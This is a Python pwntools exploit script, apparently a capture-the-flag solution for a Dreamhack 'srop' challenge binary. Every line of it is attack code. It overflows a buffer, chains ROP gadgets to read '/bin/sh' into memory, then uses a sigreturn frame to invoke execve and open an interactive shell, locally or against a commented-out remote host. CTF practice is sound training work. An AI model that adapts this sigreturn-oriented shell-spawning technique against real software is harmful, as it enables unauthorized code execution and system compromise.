from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./srop', checksec=False)

buf = 0x601b00
syscall = 0x00000000004004ec
poprax_syscall_ret = p64(0x00000000004004eb)
poprdi_ret = p64(0x0000000000400583)
poprsi_r15_ret = p64(0x0000000000400581)


frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = buf
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall


payload = b'\x00'*24
payload += poprdi_ret
payload += p64(0)
payload += poprsi_r15_ret
payload += p64(buf)
payload += p64(0)
payload += p64(exe.sym['read'])
payload += poprax_syscall_ret
payload += p64(0xf)
payload += bytes(frame)



r = process(exe.path)
#r = remote('host3.dreamhack.games', 16534)
#gdb.attach(r)
r.send(payload)
sleep(1)
r.send(b'/bin/sh\0')
r.interactive()
